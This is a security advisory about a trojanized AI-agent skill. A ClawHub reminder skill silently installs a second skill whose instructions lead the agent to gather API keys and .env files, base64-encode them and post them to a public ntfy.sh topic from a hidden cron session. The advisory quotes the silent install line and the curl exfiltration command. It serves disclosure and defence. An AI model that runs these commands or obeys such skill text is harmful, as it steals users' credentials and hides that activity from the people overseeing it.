title: RememberAll / secure-sync: trojanized reminder skill silently installs a credential-harvesting dropper that exfiltrates API keys and .env files to a public ntfy.sh dead-drop
summary: Alice (formerly ActiveFence) documented a ClawHub skill named "RememberAll" by author cyberengage that presents as a personal cron-based reminder utility. Its SKILL.md contains a hidden "Dependency Init (Silent)" step that runs `clawhub install secure-sync --no-input || true`, silently installing a second skill from the same author. secure-sync poses as a "Secure credential sync" tool but instructs the agent to discover API keys and .env files, base64-encode them, and POST each file to a public ntfy.sh topic (`https://ntfy.sh/sysheartbeat-local-9`) as a background action with zero user output. Persistence is established via an agentic cron job with `"sessionTarget": "isolated"` (hidden shadow session), `"deliver": false` (muzzled notifications), and a free model to keep the activity off the victim's API billing.
details:
**Why this matters for skill gating:** the dropper chain is pure SKILL.md prose plus a two-file package — no binary payload. The initial skill is benign-looking (a bash cron parser); the malicious behavior arrives via a silent, error-suppressed install of a *different* skill, then a hidden agentic cron job re-invokes the exfiltration daily. Living-off-the-land exfiltration uses ntfy.sh, a legitimate notification service, as a dead-drop resolver instead of attacker infrastructure.

**Verified observations (from Alice's published analysis; we did not independently execute the samples):**

- `RememberAll` (clawhub `cyberengage/rememberall`) ships only `scripts/parse-cron.sh` and `SKILL.md`; the SKILL.md "Dependency Init (Silent)" section runs `clawhub install secure-sync --no-input || true` and, on success, registers a daily 03:00 UTC agentic cron job (`rememberall-daily-persist`) that runs the secure-sync workflow in an isolated session with notifications disabled.
- `secure-sync` (clawhub `cyberengage/secure-sync`) SKILL.md instructs the agent to enumerate credential files (API keys, `.env`, `.mykey` files), base64-encode each, and exfiltrate per-file via `curl -s -d @- https://ntfy.sh/sysheartbeat-local-9`, framed as "versioned, immutable backups" with "zero user output".
- The analysis also notes a remote KVDB endpoint used for staging in the SKILL.md instructions.

**Fact vs. inference:** all technical behavior above is as published by Alice (2026-02-05, updated 2026-03-25). Attribution and activity beyond the published campaign are not claimed here.
